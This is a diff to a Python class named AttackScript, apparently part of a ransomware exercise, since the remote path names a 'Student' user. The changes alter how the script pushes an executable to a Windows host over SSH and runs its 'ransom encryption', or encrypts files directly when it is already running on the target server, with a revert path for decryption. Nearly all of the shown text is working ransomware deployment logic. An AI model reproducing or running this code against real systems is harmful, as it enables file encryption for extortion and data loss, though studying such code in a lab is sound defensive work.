@@ -340,11 +340,20 @@ class AttackScript:
         full_path_remote = "C:\\Users\\Student\\Documents\\"
         executable_name = self.SCRIPT_NAME.rsplit(".", 1)[0] + ".exe"
 
+        ip_addrs_in_system: list[str] = [i[4][0] for i in socket.getaddrinfo(socket.gethostname(), None)]
+
         if revert:
-            decrypt = ""
-            decrypt = self.ssh_run_command(full_path_remote + executable_name + " 32")
-            print(decrypt)
-            return 
+            if self.WINDOWS_SERVER_IP in ip_addrs_in_system:
+                self.revert_decrypt()
+            else:
+                decrypt = self.ssh_run_command(full_path_remote + executable_name + " 8 -r")
+                print(decrypt)
+            return   
+        
+        # If the thing is ran locally
+        if self.WINDOWS_SERVER_IP in ip_addrs_in_system:
+            self.encrypt_files()
+            return
 
         # Check Linux and Check macOS
         if platform.system() in ["Linux", "Darwin"]:
@@ -353,7 +362,7 @@ class AttackScript:
             print(check_exe)
             if executable_name in check_exe:
                 print("Previously injected executable exist on remote system, Running ransom encryption")  
-                run_exe = self.ssh_run_command(full_path_remote + executable_name + " 30")
+                run_exe = self.ssh_run_command(full_path_remote + executable_name + " 8")
                 print(run_exe)
             else:
                 raise Exception("Invalid Platform")
@@ -362,7 +371,7 @@ class AttackScript:
         elif platform.system() == "Windows":
             output = self.transfer_exe_remotely(full_path_remote)
             print(output)
-            run_exe = self.ssh_run_command(full_path_remote + executable_name + " 30")
+            run_exe = self.ssh_run_command(full_path_remote + executable_name + " 8")
             print(run_exe)
 
     def revert_decrypt(self) -> None:
